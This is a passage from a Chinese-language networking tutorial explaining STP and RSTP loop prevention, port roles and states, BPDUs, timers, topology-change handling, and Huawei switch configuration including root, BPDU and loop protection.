class="headerlink" title="1.8 配置验证"></a>1.8 配置验证</h3><ul><li><code>display interface</code> [ interface-type [ interface-number [.subnumber]]]命令用来查看端口当前运行状态和统计信息</li><li><code>current state</code>表示端口的物理状态，如果为UP，表示端口处于打开状态</li><li><code>Line protocol current state</code>表示端口的链路协议状态，如果为UP，表示端口的链路协议处于正常的启动状态</li><li><code>Speed</code>表示端口的工作速率，SWA的G0/0/1端口工作速率为100Mbit/s</li><li><code>Duplex</code>表示端口的双工模式，SWA的GO/0/1端口双工模式为全双工</li></ul><h2 id="2-STP原理与配置"><a href="#2-STP原理与配置" class="headerlink" title="2. STP原理与配置"></a>2. STP原理与配置</h2><p>为了提高网络可靠性，交换网络中通常会使用冗余链路</p><p>然而，冗余链路会给交换网络带来环路风险，并导致广播风暴以及MAC地址表不稳定等问题，进而会影响到用户的通信质量</p><p>生成树协议**STP(Spanning Tree Protocol )**可以在提高可靠性的同时又能避免环路带来的各种问题</p><h3 id="2-1-环路引起的问题"><a href="#2-1-环路引起的问题" class="headerlink" title="2.1 环路引起的问题"></a>2.1 环路引起的问题</h3><h4 id="2-1-1-二级交换网络"><a href="#2-1-1-二级交换网络" class="headerlink" title="2.1.1 二级交换网络"></a>2.1.1 二级交换网络</h4><ul><li><p>随着局域网规模的扩大，越来越多的交换机被用来实现主机之间的互连</p><p>如果交换机之间仅使用一条链路互连，则可能会出现单点故障，导致业务中断。为了解决此类问题，交换机在互连时一般都会使用冗余链路来实现备份</p></li><li><p>冗余链路虽然增强了网络的可靠性，但是也会产生环路，而环路会带来一系列的问题，继而导致通信质量下降和通信业务中断等问题</p></li></ul><h4 id="2-1-2-网络风暴"><a href="#2-1-2-网络风暴" class="headerlink" title="2.1.2 网络风暴"></a>2.1.2 网络风暴</h4><ul><li>根据交换机的转发原则，如果交换机从一个端口上接收到的是一个广播帧，或者是一个目的MAC地址未知的单播帧，则会将这个帧向除源端口之外的所有其他端口转发。如果交换网络中有环路，则这个帧会被无限转发，此时便会形成广播风暴，网络中也会充斥着重复的数据帧</li><li><img src="https://pic.imgdb.cn/item/60f43f365132923bf8e253b8.png"><br>本例中，主机A向外发送了一个单播帧，假设此单播帧的目的MAC地址在网络中所有交换机的MAC地址表中都暂时不存在。SWB接收到此帧后，将其转发到SWA和SWC，SWA和SWC也会将此帧转发到除了接收此帧的其他所有端口，结果此帧又会被再次转发给SWB ,这种循环会一直持续，于是便产生了广播风暴。交换机性能会因此急速下降，并会导致业务中断</li></ul><h4 id="2-1-3-MAC地址表震荡"><a href="#2-1-3-MAC地址表震荡" class="headerlink" title="2.1.3 MAC地址表震荡"></a>2.1.3 MAC地址表震荡</h4><ol><li><p>交换机是根据所接收到的数据帧的源地址和接收端口生成MAC地址表项的</p></li><li><p><img src="https://pic.imgdb.cn/item/60f43f365132923bf8e253b8.png"></p><p>主机A向外发送一个单播帧，假设此单播帧的目的MAC地址在网络中所有交换机的MAC地址表中都暂时不存在。SWB收到此数据帧之后，在MAC地址表中生成一个MAC地址表项，00-01-02-03-04-AA，对应端口为G0/0/3，并将其从G0/0/1和GO/0/2端口转发。此例仅以SWB从GO/0/1端口转发此帧为例进行说明</p></li><li><p>SWA接收到此帧后，由于MAC地址表中没有对应此帧目的MAC地址的表项，所以SWA会将此帧从G0/0/2转发出去</p></li><li><p>SWC接收到此帧后，由于MAC地址表中也没有对应此帧目的MAC地址的表项，所以SWC会将此帧从G0/0/2端口发送回SWB，也会发给主机B</p></li><li><p>SWB从G0/0/2接口接收到此数据帧之后，会在MAC地址表中删除原有的相关表项，生成一个新的表项，00-01-02-03-04-AA，对应端口为G0/0/2。此过程会不断重复，从而导致MAC地址表震荡</p></li></ol><h3 id="2-2-STP工作原理"><a href="#2-2-STP工作原理" class="headerlink" title="2.2 STP工作原理"></a>2.2 STP工作原理</h3><h4 id="2-2-1-STP的作用"><a href="#2-2-1-STP的作用" class="headerlink" title="2.2.1 STP的作用"></a>2.2.1 STP的作用</h4><ul><li>在以太网中，二层网络的环路会带来广播风暴，MAC地址表震荡，重复数据帧等问题，为解决交换网络中的环路问题，提出了STP</li><li>STP的主要作用︰<ol><li>消除环路∶通过阻断冗余链路来消除网络中可能存在的环路</li><li>链路备份︰当活动路径发生故障时，激活备份链路，及时恢复网络连通性</li></ol></li></ul><h4 id="2-2-2-STP操作"><a href="#2-2-2-STP操作" class="headerlink" title="2.2.2 STP操作"></a>2.2.2 STP操作</h4><ul><li><p>STP通过构造一棵树来消除交换网络中的环路</p></li><li><p>每个STP网络中，都会存在一个根桥，其他交换机为非根桥。根桥或者根交换机位于整个逻辑树的根部，是STP网络的逻辑中心，非根桥是根桥的下游设备</p><p>当现有根桥产生故障时，非根桥之间会交互信息并重新选举根桥，交互的这种信息被称为BPDU。BPDU中包含交换机在参加生成树计算时的各种参数信息，后面会有详细介绍</p></li><li><p>STP中定义了三种端口角色∶指定端口，根端口和预备端口</p></li><li><p>指定端口是交换机向所连网段转发配置BPDU的端口，每个网段有且只能有一个指定端口。一般情况下，根桥的每个端口总是指定端口</p></li><li><p>根端口是非根交换机去往根桥路径最优的端口。在一个运行STP协议的交换机上最多只有一个根端口，但根桥上没有根端口</p></li><li><p>如果一个端口既不是指定端口也不是根端口，则此端口为预备端口。预备端口将被阻塞</p></li></ul><h4 id="2-2-3-根桥选举"><a href="#2-2-3-根桥选举" class="headerlink" title="2.2.3 根桥选举"></a>2.2.3 根桥选举</h4><ul><li>STP中根桥的选举依据的是桥ID，STP中的每个交换机都会有一个桥ID(Bridge ID)。桥ID由16位的桥优先级( Bridge Priority )和48位的MAC地址构成。在STP网络中，桥优先级是可以配置的，取值范围是0~65535，默认值为32768。优先级最高的设备（数值越小越优先）会被选举为根桥。如果优先级相同，则会比较MAC地址，MAC地址越小则越优先</li><li>交换机启动后就自动开始进行生成树收敛计算。默认情况下，所有交换机启动时都认为自己是根桥，自己的所有端口都为指定端口，这样BPDU报文就可以通过所有端口转发。对端交换机收到BPDU报文后，会比较BPDU中的根桥ID和自己的桥ID。如果收到的BPDU报文中的桥ID优先级低，接收交换机会继续通告自己的配置BPDU报文给邻居交换机。如果收到的BPDU报文中的桥ID优先级高，则交换机会修改自己的BPDU报文的根桥ID字段，宣告新的根桥</li></ul><h4 id="2-2-4-根端口选举"><a href="#2-2-4-根端口选举" class="headerlink" title="2.2.4 根端口选举"></a>2.2.4 根端口选举</h4><ol><li>非根交换机在选举根端口时分别依据该端口的根路径开销、对端BID ( Bridge ID)、对端PID (Port ID)和本端PID</li><li>交换机的每个端口都有一个端口开销(Port Cost）参数，此参数表示该端口在STP中的开销值。默认情况下端口的开销和端口的带宽有关，带宽越高，开销越小。从一个非根桥到达根桥的路径可能有多条，每一条路径都有一个总的开销值，此开销值是该路径上所有接收BPDU端口的端口开销总和（即BPDU的入方向端口），称为路径开销。非根桥通过对比多条路径的路径开销，选出到达根桥的最短路径，这条最短路径的路径开销被称为RPC(Root Path Cost，根路径开销），并生成无环树状网络。根桥的根路径开销是0</li><li>一般情况下，企业网络中会存在多厂商的交换设备，华为X7系列交换机支持多种STP的路径开销计算标准，提供最大程度的兼容性。缺省情况下，华为X7系列交换机使用IEEE802.1t标准来计算路径开销</li><li>运行STP交换机的每个端口都有一个端口ID，端口ID由端口优先级和端口号构成。端口优先级取值范围是0到240，步长为16，即取值必须为16的整数倍。缺省情况下，端口优先级是128。端口ID ( Port ID)可以用来确定端口角色</li><li>每个非根桥都要选举一个根端口。根端口是距离根桥最近的端口，这个最近的衡量标准是靠路径开销来判定的，即路径开销最小的端口就是根端口。端口收到一个BPDU报文后，抽取该BPDU报文中根路径开销字段的值，加上该端口本身的端口开销即为本端口路径开销。如果有两个或两个以上的端口计算得到的累计路径开销相同，那么选择收到发送者BID最小的那个端口作为根端口</li><li>如果两个或两个以上的端口连接到同一台交换机上，则选择发送者PID最小的那个端口作为根端口。如果两个或两个以上的端口通过Hub连接到同一台交换机的同一个接口上，则选择本交换机的这些端口中的PID最小的作为根端口</li></ol><h4 id="2-2-5-指定端口选举"><a href="#2-2-5-指定端口选举" class="headerlink" title="2.2.5 指定端口选举"></a>2.2.5 指定端口选举</h4><ol><li>在网段上抑制其他端口（无论是自己的还是其他设备的)发送BPDU报文的端口，就是该网段的指定端口。每个网段都应该有一个指定端口，根桥的所有端口都是指定端口（除非根桥在物理上存在环路)</li><li>指定端口的选举也是首先比较累计路径开销，累计路径开销最小的端口就是指定端口。如果累计路径开销相同，则比较端口所在交换机的桥ID，所在桥ID最小的端口被选举为指定端口。如果通过累计路径开销和所在桥ID选举不出来，则比较端口ID，端口ID最小的被选举为指定端口</li><li>网络收敛后，只有指定端口和根端口可以转发数据。其他端口为预备端口，被阻塞，不能转发数据，只能够从所连网段的指定交换机接收到BPDU报文，并以此来监视链路的状态</li></ol><h4 id="2-2-6-端口状态转换"><a href="#2-2-6-端口状态转换" class="headerlink" title="2.2.6 端口状态转换"></a>2.2.6 端口状态转换</h4><p>运行STP协议的设备上端口状态有以下五种：</p><ol><li>Forwarding :转发状态。端口既可转发用户流量也可转发BPDU报文，只有根端口或指定端口才能进入Forwarding状态</li><li>Learning :学习状态。端口可根据收到的用户流量构建MAC地址表，但不转发用户流量。增加Learning状态是为了防止临时环路</li><li>Listening :侦听状态。端口可以转发BPDU报文，但不能转发用户流量</li><li>Blocking:阻塞状态。端口仅仅能接收并处理BPDU，不能转发BPDU，也不能转发用户流量。此状态是预备端口的最终状态</li><li>Disabled :禁用状态。端口既不处理和转发BPDU报文，也不转发用户流量</li></ol><h4 id="2-2-7-BPDU"><a href="#2-2-7-BPDU" class="headerlink" title="2.2.7 BPDU"></a>2.2.7 BPDU</h4><ul><li>为了计算生成树，交换机之间需要交换相关的信息和参数，这些信息和参数被封装在BPDU( Bridge Protocol Data Unit )中</li><li>BPDU有两种类型∶配置BPDU和TCN BPDU</li><li>配置BPDU包含了桥ID、路径开销和端口ID等参数。STP协议通过在交换机之间传递配置BPDU来选举根交换机，以及确定每个交换机端口的角色和状态。在初始化过程中，每个桥都主动发送配置BPDU。在网络拓扑稳定以后，只有根桥主动发送配置BPDU，其他交换机在收到上游传来的配置BPDU后，才会发送自己的配置BPDU</li><li>TCN BPDU是指下游交换机感知到拓扑发生变化时向上游发送的拓扑变化通知</li><li>配置BPDU中包含了足够的信息来保证设备完成生成树计算，其中包含的重要信息如下：<ul><li>根桥ID∶由根桥的优先级和MAC地址组成，每个STP网络中有且仅有一个根桥</li><li>根路径开销︰到根桥的最短路径开销</li><li>指定桥ID∶由指定桥的优先级和MAC地址组成</li><li>指定端口ID∶由指定端口的优先级和端口号组成</li><li>Message Age:配置BPDU在网络中传播的生存期</li><li>Max Age :配置BPDU在设备中能够保存的最大生存期</li><li>Hello Time:配置BPDU发送的周期</li><li>Forward Delay:端口状态迁移的延时</li></ul></li></ul><h4 id="2-2-8-计时器"><a href="#2-2-8-计时器" class="headerlink" title="2.2.8 计时器"></a>2.2.8 计时器</h4><p>STP协议中包含一些重要的时间参数，这里举例说明如下∶</p><ul><li>Hello Time是指运行STP协议的设备发送配置BPDU的时间间隔，用于检测链路是否存在故障。交换机每隔Hello Time时间会向周围的交换机发送配置BPDU报文，以确认链路是否存在故障。当网络拓扑稳定后，该值只有在根桥上修改才有效</li><li>Message Age是从根桥发送到当前交换机接收到BPDU的总时间，包括传输延时等。如果配置BPDU是根桥发出的，则Message Age为0。实际实现中，配置BPDU报文每经过一个交换机，Message Age增加1</li><li>Max Age是指BPDU报文的老化时间，可在根桥上通过命令人为改动这个值。Max Age通过配置BPDU报文的传递，可以保证Max Age在整网中一致。非根桥设备收到配置BPDU报文后，会将报文中的Message Age和Max Age进行比较︰如果Message Age小于等于Max Age，则该非根桥设备会继续转发配置BPDU报文。如果Message Age大于Max Age ,则该配置BPDU报文将被老化掉。该非根桥设备将直接丢弃该配置BPDU，并认为是网络直径过大，导致了根桥连接失败</li></ul><h3 id="2-3-STP拓扑变化"><a href="#2-3-STP拓扑变化" class="headerlink" title="2.3 STP拓扑变化"></a>2.3 STP拓扑变化</h3><h4 id="2-3-1-根桥故障"><a href="#2-3-1-根桥故障" class="headerlink" title="2.3.1 根桥故障"></a>2.3.1 根桥故障</h4><p>在稳定的STP拓扑里，非根桥会定期收到来自根桥的BPDU报文。如果根桥发生了故障，停止发送BPDU报文，下游交换机就无法收到来自根桥的BPDU报文。如果下游交换机一直收不到BPDU报文，Max Age定时器就会超时(Max Age的默认值为20秒），从而导致已经收到的BPDU报文失效，此时，非根交换机会互相发送配置BPDU报文，重新选举新的根桥。根桥故障会导致50秒左右的恢复时间，恢复时间约等于Max Age加上两倍的Forward Delay收敛时间</p><h4 id="2-3-2-直连链路故障"><a href="#2-3-2-直连链路故障" class="headerlink" title="2.3.2 直连链路故障"></a>2.3.2 直连链路故障</h4><ul><li><p><img src="https://pic.imgdb.cn/item/60f4d36c5132923bf80476d0.png"></p><p>此例中，SWA和SWB使用了两条链路互连，其中一条是主用链路，另外一条是备份链路。生成树正常收敛之后，如果SWB检测到根端口的链路发生物理故障，则其Alternate端口会迁移到Listening、Learning、Forwarding状态，经过两倍的Forward Delay后恢复到转发状态</p></li></ul><h4 id="2-3-3-非直连链路故障"><a href="#2-3-3-非直连链路故障" class="headerlink" title="2.3.3 非直连链路故障"></a>2.3.3 非直连链路故障</h4><p><img src="https://pic.imgdb.cn/item/60f4d3d45132923bf806d479.png"></p><p>本例中，SWB与SWA之间的链路发生了某种故障（非物理层故障)，SWB因此一直收不到来自SWA的BPDU报文。等待Max Age定时器超时后，SWB会认为根桥SWA不再有效，并认为自己是根桥，于是开始发送自己的BPDU报文给SWC，通知SWC自己作为新的根桥。在此期间，由于SWC的Alternate端口再也不能收到包含原根桥ID的BPDU报文。其MaxAge定时器超时后，SWC会切换Altermate端口为指定端口并且转发来自其根端口的BPDU报文给SWB。所以，Max Age定时器超时后，SWB、SWC几乎同时会收到对方发来的BPDU。经过STP重新计算后，SWB放弃宣称自己是根桥并重新确定端口角色。非直连链路故障后，由于需要等待Max Age加上两倍的Forward Delay时间，端口需要大约50秒才能恢复到转发状态</p><h4 id="2-3-4-拓扑改变导致MAC地址表错误"><a href="#2-3-4-拓扑改变导致MAC地址表错误" class="headerlink" title="2.3.4 拓扑改变导致MAC地址表错误"></a>2.3.4 拓扑改变导致MAC地址表错误</h4><ul><li><p>在交换网络中，交换机依赖MAC地址表转发数据帧。缺省情况下，MAC地址表项的老化时间是300秒。如果生成树拓扑发生变化，交换机转发数据的路径也会随着发生改变，此时MAC地址表中未及时老化掉的表项会导致数据转发错误，因此在拓扑发生变化后需要及时更新MAC地址表项</p></li><li><p><img src="https://pic.imgdb.cn/item/60f4d48b5132923bf80ad9f5.png"></p><p>本例中，SWB中的MAC地址表项定义了通过端口GigabitEthernet 0/0/3可以到达主机A，通过端口GigabitEthernet 0/0/1可以到达主机B。由于SWC的根端口产生故障，导致生成树拓扑重新收敛，在生成树拓扑完成收敛之后，从主机A到主机B的帧仍然不能到达目的地。这是因为MAC地址表项老化时间是300秒，主机A发往主机B的帧到达SWB后，SWB会继续通过端口GigabitEthernet 0/0/1转发该数据帧。</p></li></ul><h4 id="2-3-5-拓扑改变导致MAC地址表变化"><a href="#2-3-5-拓扑改变导致MAC地址表变化" class="headerlink" title="2.3.5 拓扑改变导致MAC地址表变化"></a>2.3.5 拓扑改变导致MAC地址表变化</h4><p><img src="https://pic.imgdb.cn/item/60f4d52c5132923bf80e81ea.png"></p><ul><li>拓扑变化过程中，根桥通过TCN BPDU报文获知生成树拓扑里发生了故障。根桥生成TC用来通知其他交换机加速老化现有的MAC地址表项</li><li>拓扑变更以及MAC地址表项更新的具体过程如下：<ol><li>SWC感知到网络拓扑发生变化后，会不间断地向SWB发送TCN BPDU报文</li><li>SWB收到SWC发来的TCN BPDU报文后，会把配置BPDU报文中的Flags的TCA位设置1，然后发送给SWC，告知SWC停止发送TCN BPDU报文</li><li>SWB向根桥转发TCN BPDU报文</li><li>SWA把配置BPDU报文中的Flags的TC位设置为1后发送，通知下游设备把MAC地址表项的老化时间由默认的300秒修改为Forward Delay的时间（默认为15秒)</li><li>最多等待15秒之后，SWB中的错误MAC地址表项会被自动清除。此后，SWB就能重新开始MAC表项的学习及转发操作</li></ol></li></ul><h3 id="2-4-STP的配置"><a href="#2-4-STP的配置" class="headerlink" title="2.4 STP的配置"></a>2.4 STP的配置</h3><h4 id="2-4-1-STP模式"><a href="#2-4-1-STP模式" class="headerlink" title="2.4.1 STP模式"></a>2.4.1 STP模式</h4><ul><li>华为X7系列交换机支持三种生成树协议模式</li><li>stp mode { mstp | stp | rstp }命令用来配置交换机的生成树协议模式。缺省情况下，华为X7系列交换机工作在MSTP模式。在使用STP前，STP模式必须重新配置</li></ul><h4 id="2-4-2-配置交换机优先级"><a href="#2-4-2-配置交换机优先级" class="headerlink" title="2.4.2 配置交换机优先级"></a>2.4.2 配置交换机优先级</h4><ul><li>基于企业业务对网络的需求，一般建议手动指定网络中配置高、性能好的交换机为根桥。可以通过配置桥优先级来指定网络中的根桥，以确保企业网络里面的数据流量使用最优路径转发</li><li>stp priority priority命令用来配置设备优先级值。priority值为整数，取值范围为0到61440，步长为4096。缺省情况下，交换设备的优先级取值是32768。另外，可以通过stproot primary命令指定生成树里的根桥</li></ul><h4 id="2-4-3-配置路径开销"><a href="#2-4-3-配置路径开销" class="headerlink" title="2.4.3 配置路径开销"></a>2.4.3 配置路径开销</h4><ul><li>华为X7系列交换机支持三种路径开销标准，以确保和友商设备保持兼容。缺省情况下，路径开销标准为IEEE 802.1t</li><li>stp pathcost-standard { dot1d-1998 | dot1t | legacy }命令用来配置指定交换机上路径开销值的标准</li><li>每个端口的路径开销也可以手动指定。此STP路径开销控制方法须谨慎使用，手动指定端口的路径开销可能会生成次优生成树拓扑</li><li><code>stp cost cost</code>命令取决于路径开销计算方法∶<ul><li>使用华为的私有计算方法时，cost取值范围是1～200000</li><li>使用IEEE 802.1d标准方法时，cost取值范围是1～65535</li><li>使用IEEE 802.1t标准方法时，cost取值范围是1~200000000</li></ul></li></ul><h4 id="2-4-4-配置验证"><a href="#2-4-4-配置验证" class="headerlink" title="2.4.4 配置验证"></a>2.4.4 配置验证</h4><p><code>display stp</code>命令用来检查当前交换机的STP配置。命令输出中信息介绍如下︰</p><ul><li>CIST Bridge参数标识指定交换机当前桥ID，包含交换机的优先级和MAC地址</li><li>Bridge Times参数标识Hello定时器、Forward Delay定时器、Max Age定时器的</li><li>CIST Root/ERPC参数标识根桥ID以及此交换机到根桥的根路径开销。</li></ul><p><code>display stp</code>命令显示交换机上所有端口信息</p><p><code>display stp interface interface</code>命令显示交换机上指定端口信息。其他一些信息还包括端口角色、端口状态、以及使用的保护机制等</p><h2 id="3-RSTP原理与配置"><a href="#3-RSTP原理与配置" class="headerlink" title="3. RSTP原理与配置"></a>3. RSTP原理与配置</h2><h3 id="3-1-STP不足"><a href="#3-1-STP不足" class="headerlink" title="3.1 STP不足"></a>3.1 STP不足</h3><p>STP能够提供无环网络，但是收敛速度较慢</p><p>如果STP网络的拓扑结构频繁变化，网络也会随之频繁失去连通性，从而导致用户通信频繁中断。RSTP使用了Proposal/Agreement机制保证链路及时协商，从而有效避免收敛计时器在生成树收敛前超时</p><p><img src="https://pic.imgdb.cn/item/60f4d8205132923bf81f79a6.png"></p><p>如图所示，在交换网络中，P/A过程可以从根桥向下游级联传递。</p><h3 id="3-2-RSTP端口角色"><a href="#3-2-RSTP端口角色" class="headerlink" title="3.2 RSTP端口角色"></a>3.2 RSTP端口角色</h3><p>运行RSTP的交换机使用了两个不同的端口角色来实现冗余备份</p><p>当到根桥的当前路径出现故障时，作为根端口的备份端口，Alternate端口提供了从一个交换机到根桥的另一条可切换路径。Backup端口作为指定端口的备份，提供了另一条从根桥到相应LAN网段的备份路径。当一个交换机和一个共享媒介设备例如Hub建立两个或者多个连接时，可以使用Backup端口</p><p>同样，当交换机上两个或者多个端口和同一个LAN网段连接时，也可以使用Backup端口</p><h3 id="3-3-RSTP边缘端口"><a href="#3-3-RSTP边缘端口" class="headerlink" title="3.3 RSTP边缘端口"></a>3.3 RSTP边缘端口</h3><p>RSTP里，位于网络边缘的指定端口被称为边缘端口</p><p>边缘端口一般与用户终端设备直接连接，不与任何交换设备连接</p><p>边缘端口不接收配置BPDU报文，不参与RSTP运算，可以由Disabled状态直接转到Forwarding状态，且不经历时延，就像在端口上将STP禁用了一样</p><p>但是，一旦边缘端口收到配置BPDU报文，就丧失了边缘端口属性，成为普通STP端口，并重新进行生成树计算，从而引起网络震荡</p><h3 id="3-4-端口状态"><a href="#3-4-端口状态" class="headerlink" title="3.4 端口状态"></a>3.4 端口状态</h3><table><thead><tr><th>STP</th><th>RSTP</th><th>端口角色</th></tr></thead><tbody><tr><td>Disabled</td><td>Discarding</td><td>Disable</td></tr><tr><td>Blocking</td><td>Discarding</td><td>Alternate端口、Backup端口</td></tr><tr><td>Listening</td><td>Discarding</td><td>根端口、指定端口</td></tr><tr><td>Learning</td><td>Learning</td><td>根端口、指定端口</td></tr><tr><td>Forwarding</td><td>Forwarding</td><td>根端口、指定端口</td></tr></tbody></table><p>RSTP把原来STP的5种端口状态简化成了3种：</p><ol><li>Discarding状态，端口既不转发用户流量也不学习MAC地址</li><li> Learning状态，端口不转发用户流量但是学习MAC地址</li><li> Forwarding状态，端口既转发用户流量又学习MAC地址</li></ol><h3 id="3-5-BST-BPDU"><a href="#3-5-BST-BPDU" class="headerlink" title="3.5 BST BPDU"></a>3.5 BST BPDU</h3><ul><li>除了部分参数不同，RSTP使用了类似STP的BPDU报文，即RST BPDU报文。BPDUType用来区分STP的BPDU报文和RST (Rapid Spanning Tree) BPDU报文。STP的配置BPDU报文的BPDU Type值为0(Ox00)，TCN BPDU报文的BPDUType值为128(Ox80 )，RSTBPDU报文的BPDU Type值为2(Ox02)。STP的BPDU报文的Flags字段中只定义了拓扑变化TC ( Topology Change )标志和拓扑变化确认TCA ( Topology Change Acknowledgment)标志，其他字段保留。在RST BPDU报文的Flags字段里，还使用了其他字段。包括P/A进程字段和定义端口角色以及端口状态的字段。Forwarding ，Learning与Port Role表示发出BPDU的端口的状态和角色</li><li>STP中，当网络拓扑稳定后，根桥按照Hello Timer规定的时间间隔发送配置BPDU报文，其他非根桥设备在收到上游设备发送过来的配置BPDU报文后，才会触发发出配置BPDU报文，此方式使得STP协议计算复杂且缓慢。RSTP对此进行了改进，即在拓扑稳定后，无论非根桥设备是否接收到根桥传来的配置BPDU报文，非根桥设备都会仍然按照Hello Timer规定的时间间隔发送配置BPDU，该行为完全由每台设备自主进行</li></ul><h3 id="3-6-RSTP收敛过程"><a href="#3-6-RSTP收敛过程" class="headerlink" title="3.6 RSTP收敛过程"></a>3.6 RSTP收敛过程</h3><ul><li><p>RSTP收敛遵循STP基本原理。网络初始化时，网络中所有的RSTP交换机都认为自己是“根桥”，并设置每个端口为指定端口。此时，端口为Discarding状态</p></li><li><p>每个认为自己是“根桥”的交换机生成一个RST BPDU报文来协商指定网段的端口状态，此RSTBPDU报文的Flags字段里面的Proposal位需要置位</p><p>当一个端口收到RST BPDU报文时，此端口会比较收到的RST BPDU报文和本地的RST BPDU报文。如果本地的RSTBPDU报文优于接收的RST BPDU报文，则端口会丢弃接收的RST BPDU报文，并发送Proposal置位的本地RST BPDU报文来回复对端设备</p></li><li><p>交换机使用同步机制来实现端口角色协商管理。当收到Proposal置位并且优先级高的BPDU报文时，接收交换机必须设置所有下游指定端口为Discarding状态。如果下游端口是Alternate端口或者边缘端口，则端口状态保持不变。本例说明了下游指定端口暂时迁移到Discarding状态的情形，因此，P/A进程中任何帧转发都将被阻止</p></li><li><p>当确认下游指定端口迁移到Discarding状态后，设备发送RST BPDU报文回复上游交换机发送的Proposal消息。在此过程中，端口已经确认为根端口，因此RST BPDU报文Flags字段里面设置了Agreement标记位和根端口角色</p></li><li><p>在P/A进程的最后阶段，上游交换机收到Agreement置位的RST BPDU报文后，指定端口立即从Discarding状态迁移为Forwarding状态。然后，下游网段开始使用同样的P/A进程协商端口角色</p></li></ul><h3 id="3-7-链路故障-根桥失效"><a href="#3-7-链路故障-根桥失效" class="headerlink" title="3.7 链路故障/根桥失效"></a>3.7 链路故障/根桥失效</h3><p>在STP中，当出现链路故障或根桥失效导致交换机收不到BPDU时，交换机需要等待MaxAge时间后才能确认出现了故障。而在RSTP中，如果交换机的端口在连续3次Hello Timer规定的时间间隔内没有收到上游交换机发送的RST BPDU，便会确认本端口和对端端口的通信失败，从而需要重新进行RSTP的计算来确定交换机及端口角色</p><h3 id="3-8-RSTP拓扑变化处理"><a href="#3-8-RSTP拓扑变化处理" class="headerlink" title="3.8 RSTP拓扑变化处理"></a>3.8 RSTP拓扑变化处理</h3><ol><li><p>RSTP拓扑变化的处理类似于STP拓扑变化的处理，但也有些细微差别</p></li><li><p><img src="https://pic.imgdb.cn/item/60f4db185132923bf830f894.png"></p><p>本例里面，SWC发生链路故障。SWA和SWC立即检测到链路故障并清除连接此链路的端口上的MAC地址表项</p><p>接下来SWC选举出新的根端口并立即进入Forwarding状态，因此触发SWC向外发送TC置位的BPDU报文(以下简称TC报文)。通知上游交换机清除所有其他端口上的MAC地址表项，除了接收到TC报文的端口。TC报文周期性地转发给邻居，在此周期内，所有相关接口上MAC地址表项将会被清除，重新学习MAC地址表项。图形里面红色X表示由于拓扑变化导致端口上的MAC地址表项被清除</p></li></ol><h3 id="3-9-STP兼容"><a href="#3-9-STP兼容" class="headerlink" title="3.9 STP兼容"></a>3.9 STP兼容</h3><ul><li>RSTP是可以与STP实现后向兼容的，但在实际中，并不推荐这样的做法，原因是RSTP会失去其快速收敛的优势，而STP慢速收敛的缺点会暴露出来</li><li>当同一个网段里既有运行STP的交换机又有运行RSTP的交换机时，STP交换机会忽略接收到的RST BPDU，而RSTP交换机在某端口上接收到STP BPDU时，会等待两个Hello Time时间之后，把自己的端口转换到STP工作模式，此后便发送STP BPDU，这样就实现了兼容性操作</li></ul><h3 id="3-10-配置STP模式"><a href="#3-10-配置STP模式" class="headerlink" title="3.10 配置STP模式"></a>3.10 配置STP模式</h3><ul><li>在Sx7交换机上，可以使用<code>stp mode rstp</code>命令来配置交换机工作在RSTP模式</li><li><code>stp mode rstp</code>命令在系统视图下执行，此命令必须在所有参与快速生成树拓扑计算的交换机上配置。</li></ul><h3 id="3-11-配置验证"><a href="#3-11-配置验证" class="headerlink" title="3.11 配置验证"></a>3.11 配置验证</h3><p><code>display stp</code>命令可以显示RSTP配置信息和参数</p><p>根据显示信息可以确认交换机是否工作在RSTP模式</p><h3 id="3-12-配置边缘端口"><a href="#3-12-配置边缘端口" class="headerlink" title="3.12 配置边缘端口"></a>3.12 配置边缘端口</h3><ul><li>边缘端口完全不参与STP或RSTP计算。边缘端口的状态要么是Disabled，要么是Forwarding；终端上电工作后，它就直接由Disabled状态转到Forwarding状态，终端下电后，它就直接由Forwarding状态转到Disabled状态</li><li>交换机所有端口默认为非边缘端口</li><li>stp edged-port enable命令用来配置交换机的端口为边缘端口，它是一个针对某一具体端口的命令</li><li>stp edged-port default命令用来配置交换机的所有端口为边缘端口</li><li>stp edged-port disable命令用来将边缘端口的属性去掉，使之成为非边缘端口。它也是一个针对某一具体端口的命令</li><li>需要注意的是，华为Sx7系列交换机运行STP时也可以使用边缘端口设置</li></ul><h3 id="3-13-根保护"><a href="#3-13-根保护" class="headerlink" title="3.13 根保护"></a>3.13 根保护</h3><p>由于错误配置根交换机或网络中的恶意攻击，根交换机有可能会收到优先级更高的BPDU报文，使得根交换机变成非根交换机，从而引起网络拓扑结构的变动</p><p>这种不合法的拓扑变化，可能会导致原来应该通过高速链路的流量被牵引到低速链路上，造成网络拥塞</p><p>交换机提供了根保护功能来解决此问题。根保护功能通过维持指定端口角色从而保护根交换机。一旦启用了根保护功能的指定端口收到了优先级更高的BPDU报文时，端口会停止转发报文并且进入Listening状态。经过一段时间后，如果端口一直没有再收到优先级较高的BPDU报文，端口就会自动恢复到原来的状态</p><p>根保护功能仅在指定端口生效，不能配置在边缘端口或者使能了环路保护功能的端口上</p><h3 id="3-14-BPDU保护"><a href="#3-14-BPDU保护" class="headerlink" title="3.14 BPDU保护"></a>3.14 BPDU保护</h3><ol><li>正常情况下，边缘端口是不会收到BPDU的。但是，如果有人发送BPDU来进行恶意攻击时，边缘端口就会收到这些BPDU，并自动变为非边缘端口，且开始参与网络拓扑计算，从而会增加整个网络的计算工作量，并可能引起网络震荡</li><li>为防止上述情况的发生，我们可以使用BPDU保护功能。使能BPDU保护功能后的交换机的边缘端口在收到BPDU报文时，会立即关闭该端口，并通知网络管理系统。被关闭的边缘端口可配置成自动恢复或管理员手动恢复</li><li>如需使能BPDU保护功能，可在系统视图下执行<code>stp bpdu-protection</code>命令</li></ol><h3 id="3-15-环路保护"><a href="#3-15-环路保护" class="headerlink" title="3.15 环路保护"></a>3.15 环路保护</h3><ol><li>交换机通过从上游交换机持续收到BPDU报文来维护根端口和阻塞端口的状态。当由于链路拥塞或者单向链路故障时，交换机不能收到上游交换机发送的BPDU报文，交换机重新选择根端口。最初的根端口会变成指定端口，阻塞端口进入Forwarding状态，这就有可能导致网络环路</li><li>交换机提供了环路保护功能来避免这种环路的产生。环路保护功能使能后，如果根端口不能收到上游交换机发送的BPDU报文，则向网管发出通知信息。根端口会被阻塞，阻塞端口仍然将保持阻塞状态，这样就避免了可能发生的网络环路</li><li>如需使能环路保护功能，可在接口视图下执行<code>stp loop-protection</code>命令</li></ol><h3 id="3-16-配置验证2"><a href="#3-16-配置验证2" class="headerlink" title="3.16 配置验证2"></a>3.16 配置验证2</h3><p><code>display stp interface 